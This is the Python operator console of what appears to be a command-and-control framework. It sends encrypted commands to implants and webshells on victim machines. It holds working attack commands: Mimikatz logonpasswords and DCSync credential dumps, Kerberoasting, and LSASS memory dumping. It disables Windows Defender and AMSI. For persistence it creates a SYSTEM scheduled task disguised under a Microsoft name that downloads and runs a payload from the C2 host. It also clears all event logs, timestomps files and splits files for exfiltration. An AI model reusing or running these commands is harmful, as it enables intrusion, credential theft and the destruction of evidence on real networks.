# Embedded file name: core\cmd.py
import _thread
import binascii
import hashlib
import pickle
import time

from prettytable import PrettyTable
from rich.console import Console
from rich import box
from rich.live import Live
from rich.table import Table

from core import config
from core import webserver
from core import webshell
from core.Encryption import *
from core.color import *
from core.config import *
from lib import prettytable
from subprocess import call

console = Console()


def Command_Completer(text, state):
    options = [i for i in cmd.COMMANDS if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None


class cmd:
    COMMANDS = ['exit',
                'show',
                'reset',
                'help',
                'list',
                'use',
                'delete',
                'back',
                'payload',
                'modules',
                'encode64',
                'gen_ntlm',
                'drm',
                'DA',
                'downloads',
                'download',
                'upload',
                'set_beacon',
                'kerb',
                'dumpcreds',
                'dcsync_admins',
                'dcsync_list',
                'dcsync_all',
                'screenshot',
                'kill_all',
                'delete_all',
                'get_groups',
                'get_users',
                'bloodhound',
                'dis_amsi',
                'unamanged_powershell',
                'persist_schtasks',
                'migrate',
                'processlist',
                'split',
                'join',
                'webshell_mode',
                'register_webshell',
                'list_webshells',
                'list_agents',
                'generate_webshell',
                'time_stomp',
                'clear_all_logs',
                'lsass_memory_dump']

    HELPCOMMANDS = [['exit', 'Exit the console , or kill the agent '],
                    ['reset', 'Clear screen'],
                    ['list', 'List all agents'],
                    ['help', 'Help menu'],
                    ['show', 'Show Command and Controler variables'],
                    ['use', 'Interact with AGENT'],
                    ['back', 'Back to the main'],
                    ['payload', 'Show Payloads'],
                    ['load', 'load modules'],
                    ['kill_all', 'kill all agents'],
                    ['delete', 'delete agent from the list'],
                    ['delete_all', 'delete all agents in the list'],
                    ['set_beacon', 'set the beacon interval live for agent'],
                    ['download', 'download file from the vicitm'],
                    ['downloads', 'list downloaded files'],
                    ['upload', 'upload files to the victim'],
                    ['modules', 'list all the Available modules in Modules directory'],
                    ['encode64', 'encode any command to base64 encoded UTF-8 command ( can be decoded in powershell)'],
                    ['gen_ntlm', 'generate ntlm hash for given passowrd'],
                    ['drm', 'disable windows realtime monitoring - require admin privileges'],
                    ['screenshot', 'take screenshot form  the victim'],
                    ['DA', 'Run defense Analysis Module'],
                    ['kerb', 'do kerberoast attack  and dump  service accounts hashes'],
                    ['dcsync_all', 'do dcsync attack and get all users hashes'],
                    ['dcsync_admins', 'do dcsync attack agains admin users'],
                    ['dumpcreds', 'load mimikatz and dump credentials'],
                    ['dcsync_list', 'do dcsync attack agains custom user list '],
                    ['get_groups', 'get all the groups user is member of'],
                    ['get_users', 'get all the users member in group'],
                    ['bloodhound', 'run bloodhound to collect all the information about the AD'],
                    ['unamanged_powershell', 'run powershell payload through the dotnet agent'],
                    ['persist_schtasks', 'persistence using schedule tasks'],
                    ['migrate',
                     'migrate to new process ( default nslookup ) to hide the backdoor , this command will only work if you enabled donut in campaign creation '],
                    ['processlist', 'list processes formated ( Name , ID , Commandline)'],
                    ['split',
                     'split file to small size files for data exfiltration (use join command for files in current server or use join.ps1 script to join data on windows )'],
                    ['join',
                     'join splited file names ( include the original file name in the path and the script will know the file parts)'],
                    ['webshell_mode', 'enter webshell mode to register and control your shells)'],
                    ['register_webshell', 'register webshell to be controlled : register_webshell <URL> <KEY>)'],
                    ['list_webshells', 'list all webshells registered )'],
                    ['list_agents', 'list all agents )'],
                    ['time_stomp',
                     'change the ( access , modify , creation ) time of destination file as same as the source file ) . Usage time_stomp < source path > < destination path >'],
                    ['clear_all_logs', 'this command will clear all windows event logs in the system'],
                    ['lsass_memory_dump',
                     'dump lsass memory without touching the disk then parse it and provide credentials )']]

    def help(self, args=None):
        table = prettytable.PrettyTable(
            [bcolors.BOLD + 'Command' + bcolors.ENDC, bcolors.BOLD + 'Description' + bcolors.ENDC])
        table.border = False
        table.align = 'l'
        table.add_row(['-------', '-----------'])
        for i in self.HELPCOMMANDS:
            table.add_row([bcolors.OKBLUE + i[0] + bcolors.ENDC, i[1]])
        print(table, end="\n\n")
    """Below is a white ascii box"""
    #def help(self, args=None):
    #    table = Table(show_header=True, show_lines=True, box=box.ASCII,
    #                  safe_box=False)  # Disabled safe_box for better cmd.exe display
    #    table.add_column("Command", justify="left")
    #    table.add_column("Description", justify="left")
    #    with Live(table, refresh_per_second=1) as live:
    #        for command in self.HELPCOMMANDS:
    #            table.add_row(f"[bold blue]{command[0]}[/bold blue]", f"[white]{command[1]}[/white]")

    def exit(self, args=None):
        if config.get_pointer() == 'main':
            exit(0)
        if config.get_pointer() == 'webshell' or config.Implant_Type == 'webshell':
            config.set_pointer('main')
            config.Implant_Type = ''
            with open('.webshells', 'wb') as f:
                pickle.dump(config.WEBSHELLS, f)
        else:
            # config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"exit"))
            config.COMMAND[config.get_pointer()].append(
                encrypt(config.AESKey, "kill " + config.AGENTS[config.get_pointer()][8]))

    def list(self, args=None):
        if config.Implant_Type == 'webshell':
            cmd.list_webshells(self)
        else:
            cmd.list_agents(self)

    def reset(self, args=None):
        # check and make call for specific operating system
        _ = call('clear' if os.name == 'posix' else 'cls')

    def list_agents(self, args=None):
        table = prettytable.PrettyTable([bcolors.BOLD + 'ID' + bcolors.ENDC,
                                         bcolors.BOLD + 'Status' + bcolors.ENDC,
                                         bcolors.BOLD + 'ExternalIP' + bcolors.ENDC,
                                         bcolors.BOLD + 'InternalIP' + bcolors.ENDC,
                                         bcolors.BOLD + 'OS' + bcolors.ENDC,
                                         bcolors.BOLD + 'Arch' + bcolors.ENDC,
                                         bcolors.BOLD + 'ComputerName' + bcolors.ENDC,
                                         bcolors.BOLD + 'Username' + bcolors.ENDC,
                                         bcolors.BOLD + 'PID' + bcolors.ENDC])
        table.border = False
        table.align = 'l'
        table.add_row(['--',
                       '------',
                       '----------',
                       '----------',
                       '--',
                       '----',
                       '------------',
                       '--------',
                       '----'])
        for i in config.AGENTS:
            status = time.time() - config.TIME[i]
            table.add_row([bcolors.OKBLUE + str(config.AGENTS[i][0]) + bcolors.ENDC,
                           status,
                           config.AGENTS[i][1],
                           config.AGENTS[i][3],
                           config.AGENTS[i][2].split('|')[0],
                           config.AGENTS[i][4],
                           config.AGENTS[i][5],
                           config.AGENTS[i][6] + '\\' + config.AGENTS[i][7],
                           config.AGENTS[i][8]])

        print(table)

    def use(self, args=None):
        if config.get_pointer() == 'webshell':
            if len(args) < 2:
                return
            id = args[1]
            for i in config.WEBSHELLS:
                if id == config.WEBSHELLS[i][0]:
                    id = i
                    config.set_pointer(i)
                    config.Implant_Type = 'webshell'
                    break
        else:
            if len(args) < 2:
                return
            id = args[1]
            for i in config.AGENTS:
                if id == str(config.AGENTS[i][0]):
                    id = i
                    config.set_pointer(i)
                    config.Implant_Type = 'agent'
                    break

    def webshell_mode(self, args=None):
        config.set_pointer('webshell')
        config.Implant_Type = 'webshell'

    def kill_all(self, args=None):
        if config.get_pointer() != 'main':
            config.set_pointer('main')
        for i in config.AGENTS:
            config.COMMAND[i].append(encrypt(config.AESKey, "kill " + config.AGENTS[i][8]))

    def delete_all(self, args=None):
        if config.get_pointer() != 'main':
            config.set_pointer('main')
        config.AGENTS.clear()
        webserver.COUNT = 0

    def delete(self, args=None):
        if config.get_pointer() == 'webshell' or config.Implant_Type == 'webshell':
            config.set_pointer('webshell')
            id = args[1]
            webshell = ''
            for i in config.WEBSHELLS:
                if id == str(config.WEBSHELLS[i][0]):
                    webshell = i
                    break
            if webshell != '':
                del config.WEBSHELLS[webshell]
            return
        if config.get_pointer() != 'main':
            config.set_pointer('main')
        if len(args) < 2:
            print("delete <id>")
            return
        id = args[1]
        agent = ''
        for i in config.AGENTS:
            if id == str(config.AGENTS[i][0]):
                agent = i
                break
        if agent != '':
            del config.AGENTS[agent]

    def back(self, args=None):
        if config.Implant_Type == 'webshell':
            config.set_pointer('webshell')
        else:
            config.set_pointer('main')
            config.Implant_Type = ''

    def payload(self, args=None):
        for i in config.PAYLOADS:
            console.print(i, style="green")
        print("")

    def show(self, args=None):
        pass

    def load(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        fpm = open('Modules/' + args[1], 'r')
        module = fpm.read()
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, module))
        fpm.close()

    def downloads(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if os.path.isdir("downloads"):
            downloads = os.listdir("downloads")
            for file in downloads:
                print(file)
        else:
            print("[-] downloads directory not Available")

    def modules(self, args=None):
        if os.path.isdir("Modules"):
            modules = os.listdir("Modules")
            for module in modules:
                print(module)
        else:
            print("[-] modules directory not Available")

    def encode64(self, args=None):
        if len(args) > 1:
            b64 = ""
            # for i in args[1:]:
            #    b64=b64+i+" "
            b64 = ' '.join(args[1:])
            print(b64)
            print("encoded command :  " + base64.b64encode(b64.encode('UTF-16LE')).decode("utf-8"))
        else:
            print("[-] please add your command as argument : encode64 <command>")

    def gen_ntlm(self, args=None):
        if len(args) > 1:
            password = args[1]
            hash = hashlib.new('md4', password.encode('utf-16le')).digest()
            hash = binascii.hexlify(hash)
            print("NTLM Hash :  " + hash.decode("UTF-8"))
        else:
            print("[-] please add your password as argument : gen_ntlm <password>")

    def DA(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        # config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load PowerView.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load DA.ps1"))

    def kerb(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        # config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load Find-PSServiceAccounts.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load Invoke-Kerberoast.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load kerb.ps1"))

    def dcsync_admins(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        print("grab some coffe this may take too long to finish if the domain admin users are more than 10")
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load Invoke-Mimikatz.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,
                                                            """$users=(Get-ADGroupMember -Identity "Domain Admins").SamAccountName;For ($i=0; $i -le $users.Length; $i=$i+5) {echo $users[$i..($i+4)] | ForEach-Object  { $t='"lsadump::dcsync /user:rep"';$t=$t.replace("rep",$_);Invoke-Mimikatz -Command $t}}"""))

    def dcsync_all(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load Invoke-Mimikatz.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,
                                                            """Invoke-Mimikatz -Command '"lsadump::dcsync /domain:{domain} /all /csv"'""".replace(
                                                                "{domain}", config.AGENTS[config.get_pointer()][6])))

    def dcsync_list(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        user = []
        try:
            if len(args) < 2:
                print("Usage dcsunc_list <full file path>")
                return
            print("grab some coffe this may take too long to finish if the users are more than 10")
            if len(' '.join(args[1:]).split(",")) > 1:
                users = ' '.join(args[1:]).replace(", ", ",").replace(" ,", ",")
            else:
                list = open(args[1], 'r')
                users = list.read()
                list.close()
                users = users.replace("\n", ",")
                users = "".join(users)
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load Invoke-Mimikatz.ps1"))
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,
                                                                """$users=("{users}").split(",");For ($i=0; $i -le $users.Length; $i=$i+5) {echo $users[$i..($i+4)] | ForEach-Object  { $t='"lsadump::dcsync /user:rep"';$t=$t.replace("rep",$_);Invoke-Mimikatz -Command $t}}""".replace(
                                                                    "{users}", users)))
        except Exception as e:
            print(e)

    def get_groups(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        try:
            if len(args) < 2:
                print("Usage get_groups <user name>")
                return
            user = ' '.join(args[1:])
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load PowerView.ps1"))
            user = """(New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$("{user}")))")).FindOne().GetDirectoryEntry().memberOf""".replace(
                "{user}", user)
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, user))
        except Exception as e:
            print(e)

    def get_users(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        try:
            if len(args) < 2:
                print("Usage get_users <group name>")
                return
            group = ' '.join(args[1:])
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load PowerView.ps1"))
            group = """Get-DomainGroupMember -Identity "{group}" -Recurse""".replace("{group}", group)
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, group))
        except Exception as e:
            print(e)

    def bloodhound(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load SharpHound.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,
                                                            "Invoke-BloodHound -CollectionMethod All -NoSaveCache -RandomFilenames -ZipFileName " + "".join(
                                                                [random.choice(string.ascii_uppercase) for i in
                                                                 range(5)])))

    def drm(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        config.COMMAND[config.get_pointer()].append(
            encrypt(config.AESKey, "Set-MpPreference -DisableRealtimeMonitoring 1"))

    def dis_amsi(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load AMSI_Bypass.ps1"))

    def dumpcreds(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load Invoke-Mimikatz.ps1"))
        config.COMMAND[config.get_pointer()].append(
            encrypt(config.AESKey, """Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'"""))

    def persist_schtasks(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        CC = ''
        while len(CC) == 0:
            CC = input(
                'please enter schedule type ( hourly , daily , weekly , onstart) or type exit to exit the persistence module')
            if len(CC) > 1:
                try:
                    if CC == 'hourly':
                        freq = "Hourly"
                        break;
                    if CC == 'daily':
                        freq = 'Daily'
                        break
                    if CC == 'onstart':
                        freq = 'onstart'
                        break
                    if CC == 'weekly':
                        freq = 'weekly'
                        break
                    if CC == 'exit':
                        return
                except:
                    print("you entered wrong schedule type")
                    CC = ''
                    continue
            else:
                CC = ''
                continue
        if SSL == True:
            http = "https"
        else:
            http = "http"
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,
                                                            """schtasks /F /create /SC {freq} /RU "NT Authority\SYSTEM" /TN "\\Microsoft\\Windows\\UpdateOrchestrators\\AC Power install" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''{HTTP}://{ip}:{port}{payload}''')'\"""".replace(
                                                                '{ip}', HOST).replace('{port}', PORT).replace(
                                                                '{payload}', raw_payload).replace('{HTTP}',
                                                                                                  http).replace(
                                                                '{freq}', freq)))

    def screenshot(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        f = open("agents/screenshot.ninja", "r")
        payload = f.read()
        f.close()
        if SSL == True:
            payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{image}', image_url).replace(
                '{cmd}', command_url).replace('{HTTP}', "https")
        else:
            payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{image}', image_url).replace(
                '{cmd}', command_url).replace('{HTTP}', "http")
        f = open("Modules/screenshot.ps1", "w")
        f.write(payload)
        f.close()
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load screenshot.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "scr  -test 0 "))

    def upload(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type == 'webshell':
            _thread.start_new_thread(webshell.upload_file, (config.WEBSHELLS[config.POINTER], args,))
        else:
            f = open("agents/upload.ninja", "r")
            payload = f.read()
            f.close()
            if SSL == True:
                payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{upload}', upload_url).replace(
                    '{HTTP}', "https")
            else:
                payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{upload}', upload_url).replace(
                    '{HTTP}', "http")
            f = open("Modules/upload.ps1", "w")
            f.write(payload)
            f.close()
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load upload.ps1"))
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "up -filename \"" + args[1] + "\""))

    def download(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type == 'webshell':
            _thread.start_new_thread(webshell.download_file, (config.WEBSHELLS[config.POINTER], args,))
        else:
            global loaded
            f = open("agents/download.ninja", "r")
            payload = f.read()
            f.close()
            if SSL == True:
                payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{download}',
                                                                                        download_url).replace('{HTTP}',
                                                                                                              "https")
            else:
                payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{download}',
                                                                                        download_url).replace('{HTTP}',
                                                                                                              "http")
            f = open("Modules/download.ps1", "w")
            f.write(payload)
            f.close()
            # if loaded["download"]==False:
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load download.ps1"))
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "dn -filename \"" + args[1] + "\""))

    def set_beacon(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        global loaded
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "$exchange=" + args[1]))

    def unamanged_powershell(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        global loaded
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "loadpsh payload-obf.ps1"))

    def migrate(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        if config.Donut == False:
            print("you can't run this command as Donut disabled in campaign creation")
            return
        global loaded
        shellcode = donut.create(file="payloads/dropper_cs.exe")
        fp = open('agents/Migrator.ninja', 'r')
        temp = fp.read()
        temp = temp.replace('{shellcode}', base64.b64encode(shellcode).decode("utf-8")).replace('{class}', "".join(
            [random.choice(string.ascii_uppercase) for i in range(5)]))
        output = open('Modules/Migrator.ps1', 'w')
        output.write(temp)
        output.close()
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load Migrator.ps1"))

    def processlist(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return

        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,
                                                            "Get-WmiObject Win32_Process  | select Name,ProcessId,CommandLine | Format-Table -Wrap -AutoSize"))

    def split(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        MB = ''
        if len(args) < 2:
            print("Usage split <full file path>")
            return
        path = ' '.join(args[1:])
        while len(MB) == 0:
            MB = input('please enter the split size in MB ')
            if len(MB) > 0:
                try:
                    Bytes = int(MB) * (1024 ** 2)
                except:
                    print("Error reading the size provided")
                    MB = ''
                    continue
            else:
                MB = ''
                continue
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load split.ps1"))
        config.COMMAND[config.get_pointer()].append(
            encrypt(config.AESKey, "split -path " + path + " -chunksize " + str(Bytes)))

    def join(self, args=None):
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return
        if len(args) < 2:
            print("Usage join <full Dir path with original file name at the end of path>")
            return
        path = ' '.join(args[1:])
        filenames = glob.glob(path + ".*.part")
        list.sort(filenames)

        if len(filenames) == 0:
            print("No files found check the path provided and original file name")
            return
        with open(path, 'wb') as outfile:

            for names in filenames:
                with open(names, "rb") as infile:
                    outfile.write(infile.read())
        outfile.close()

    def register_webshell(self, args=None):
        if config.get_pointer() != 'webshell':
            print("you can only use this command in webshell mode !")
            return
        if len(args) < 3:
            print("Usage register_webshell <URL> <Key>")
            return

        URL = args[1]
        KEY = args[2]
        config.WEBSHELL_COUNT = 0
        for i in config.WEBSHELLS:
            config.WEBSHELL_COUNT = config.WEBSHELL_COUNT + 1
        config.WEBSHELLS.update({config.WEBSHELL_COUNT: [str(config.WEBSHELL_COUNT + 1), URL, KEY]})
        config.WEBSHELL_COUNT = config.WEBSHELL_COUNT + 1

    def list_webshells(self, args=None):
        t = PrettyTable(['id', 'URL', 'KEY'])
        for i in config.WEBSHELLS:
            table = config.WEBSHELLS[i]
            # table.insert(0,i)
            t.add_row(table)
        print(t)

    def generate_webshell(self, args=None):
        webshell.generate_webshell()

    def time_stomp(self, args=None):
        if config.Implant_Type == 'webshell' and config.get_pointer() != 'webshell' and config.get_pointer() != 'main':
            _thread.start_new_thread(webshell.time_stomp, (config.WEBSHELLS[config.POINTER], args,))

        if config.Implant_Type == 'agent' and config.get_pointer() != 'webshell' and config.get_pointer() != 'main':
            if len(args) < 3:
                print(
                    "Usage : time_stomp <path of the file you want to have same ( access , modify , creation ) date > < destination file to edit its date >")
                return
            else:

                Commands = "$(Get-item {Dest_Path}).creationtime=$(Get-item {Src_Path} ).creationtime;$(Get-item {Dest_Path}).lastaccesstime=$(Get-item {Src_Path} ).lastaccesstime;$(Get-item {Dest_Path}).lastwritetime=$(Get-item {Src_Path} ).lastwritetime"
                Commands = Commands.replace("{Src_Path}", args[1]).replace("{Dest_Path}", args[2])
                config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, Commands))

    def clear_all_logs(self, args=None):
        if config.Implant_Type == 'webshell' and config.get_pointer() != 'webshell' and config.get_pointer() != 'main':
            _thread.start_new_thread(webshell.webshell_execute,
                                     (config.WEBSHELLS[config.POINTER], ["""wevtutil cl "Windows PowerShell" """],))
            _thread.start_new_thread(webshell.webshell_execute, (
                config.WEBSHELLS[config.POINTER], ["""for /f %x in ('wevtutil el') do (wevtutil cl "%x")"""],))

        if config.Implant_Type == 'agent' and config.get_pointer() != 'webshell' and config.get_pointer() != 'main':
            # config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""wevtutil cl "Windows PowerShell" """))
            # config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""for /f %x in ('wevtutil el') do wevtutil cl "%x" """))
            config.COMMAND[config.get_pointer()].append(
                encrypt(config.AESKey, """wevtutil el | Foreach-Object {Write-Host "Clearing $_"; wevtutil cl "$_"}"""))

    def lsass_memory_dump(self, args=None):
        if config.get_pointer() == 'main':
            print("you can't use this command in main ! chose an agent")
            return
        if config.Implant_Type != 'agent':
            print("This command can only be used in agent mode")
            return

        try:
            fp = open('Modules/safetydump.ninja', 'r')
            temp = fp.read()
            temp = temp.replace('{CLASS}', "".join([random.choice(string.ascii_uppercase) for i in range(5)]))
            output = open('Modules/SafetyDump.ps1', 'w')
            output.write(temp)
            output.close()
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey, "load SafetyDump.ps1"))
        except:
            print("Error in lsass_memory_dump")
